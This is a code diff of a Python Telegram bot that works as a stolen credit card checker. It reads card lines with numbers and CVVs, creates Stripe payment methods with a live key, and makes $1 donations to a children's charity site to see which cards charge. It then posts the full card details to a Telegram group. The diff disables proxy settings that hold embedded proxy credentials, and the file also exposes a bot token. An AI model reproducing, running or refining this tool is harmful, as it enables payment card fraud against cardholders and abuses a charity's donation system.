@@ -5,14 +5,16 @@ import string
 import os
 import time
 import traceback
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup  # Removed ParseMode
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler
 import html
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup  # Removed ParseMode
+from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler  # Changed Filters to filters
+# from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler  # Old import
 
-proxy = {
-    'http': 'http://user-PP_8TM74LBMHH-country-GB:81c9mj0z@sp-pro.porterproxies.com:7000',
-    'https': 'http://user-PP_8TM74LBMHH-country-GB:81c9mj0z@sp-pro.porterproxies.com:7000'
-}
+# --- Removed Proxy temporarily to avoid issues ---
+# proxy = {
+#     'http': 'http://user-PP_8TM74LBMHH-country-GB:81c9mj0z@sp-pro.porterproxies.com:7000',
+#     'https': 'http://user-PP_8TM74LBMHH-country-GB:81c9mj0z@sp-pro.porterproxies.com:7000'
+# }
 
 bot_token = '7687853605:AAFUZsQZg8J8ZAYN1iArwyuN8p6xSEXwBws'
 approved_groups = ['-1002344438713']
@@ -27,7 +29,8 @@ def generate_random_account():
 def get_current_ip(session):
     try:
         ip_check_url = "https://api.ipify.org?format=json"
-        response = session.get(ip_check_url, proxies=proxy, timeout=10)
+        # response = session.get(ip_check_url, proxies=proxy, timeout=10)  # Temporarily remove proxy
+        response = session.get(ip_check_url, timeout=10)  # Removed proxy
         return response.json().get('ip', 'Unknown IP')
     except Exception as e:
         print(f"Failed to get IP: {e}")
@@ -78,14 +81,20 @@ def process_credit_card(cc_line, nonce, message_id, context, total_cards, curren
     data = f'type=card&billing_details[name]=Test+User&billing_details[email]={acc}&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr'
 
     try:
+        # response = session.post(
+        #     'https://api.stripe.com/v1/payment_methods',
+        #     headers=headers,
+        #     data=data,
+        #     proxies=proxy,  # Temporarily remove proxy
+        #     timeout=20
+        # )
+
         response = session.post(
             'https://api.stripe.com/v1/payment_methods',
             headers=headers,
             data=data,
-            proxies=proxy,
             timeout=20
         )
-
         if response.status_code != 200 or 'id' not in response.json():
             gateway = "Stripe ($1.0)"
             proxy_used = get_current_ip(session)
@@ -116,11 +125,18 @@ def process_credit_card(cc_line, nonce, message_id, context, total_cards, curren
             'action': 'make_donation',
         }
 
+        # response = session.post(
+        #     'https://needhelped.com/wp-admin/admin-ajax.php',
+        #     headers=headers,
+        #     data=data,
+        #     proxies=proxy,  # Temporarily remove proxy
+        #     timeout=20
+        # )
+
         response = session.post(
             'https://needhelped.com/wp-admin/admin-ajax.php',
             headers=headers,
             data=data,
-            proxies=proxy,
             timeout=20
         )
 
@@ -141,7 +157,7 @@ def process_credit_card(cc_line, nonce, message_id, context, total_cards, curren
             gateway = "Stripe ($1.0)"
             proxy_used = get_current_ip(session)
             message = "Completely charged! ✅"
-            status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝐞𝘄𝗮𝘆: { gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
+            status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝗲𝘄𝗮𝘆: { gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
             charged_count += 1
             update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
             context.bot.send_message(chat_id=context.chat_data.get('chat_id'), text=status)
@@ -150,7 +166,7 @@ def process_credit_card(cc_line, nonce, message_id, context, total_cards, curren
 
         message = 'Declined'
         gateway = "Stripe ($1.0)"
-        status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝐞𝘄𝗮𝘆: {gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {get_current_ip(session)} \n [↯] Dev. @eaeaksh"
+        status = f" 〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝗲𝘄𝗮𝘆: {gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {get_current_ip(session)} \n [↯] Dev. @eaeaksh"
         declined_count += 1
         update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
         time.sleep(2)
@@ -161,7 +177,7 @@ def process_credit_card(cc_line, nonce, message_id, context, total_cards, curren
         gateway = "Stripe ($1.0)"
         proxy_used = get_current_ip(session)
         message = str(e)
-        status = f"〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝐞𝘄𝗮𝘆: {gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
+        status = f"〢 𝗖𝗖: {cc}|{mm}|{yy}|{cvv}\n [↯] 𝐌𝐞𝐬𝐬𝗮𝗴𝗲: {message}\n [↯] 𝐆𝐚𝐭𝗲𝘄𝗮𝘆: {gateway}\n [↯] 𝐏𝐫𝐨𝐱𝐲: {proxy_used} \n [↯] Dev. @eaeaksh"
         update_message(context, context.chat_data.get('chat_id'), message_id, status, total_cards, current_card, charged_count, declined_count)
         time.sleep(3)
         return charged_count, declined_count
@@ -192,10 +208,15 @@ def process_file(update: Update, context: CallbackContext, file_path: str):
 
         initial_session = requests.Session()
         try:
+            # response = initial_session.get(
+            #     'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
+            #     headers={'user-agent': generate_user_agent()},
+            #     proxies=proxy,  # Temporarily remove proxy
+            #     timeout=20
+            # )
             response = initial_session.get(
                 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
                 headers={'user-agent': generate_user_agent()},
-                proxies=proxy,
                 timeout=20
             )
 
@@ -271,8 +292,8 @@ def main():
     dp.add_error_handler(error_handler)
 
     dp.add_handler(CommandHandler("ping", handle_message))
-    dp.add_handler(MessageHandler(Filters.document, handle_message))
-    dp.add_handler(MessageHandler(Filters.text, handle_message))
+    dp.add_handler(MessageHandler(filters.Document.DOC, handle_message))  # Use filters.Document
+    dp.add_handler(MessageHandler(filters.TEXT, handle_message))  # Use filters.TEXT
     dp.add_handler(CallbackQueryHandler(handle_callback))
 
     updater.job_queue.run_once(start_bot, 0)
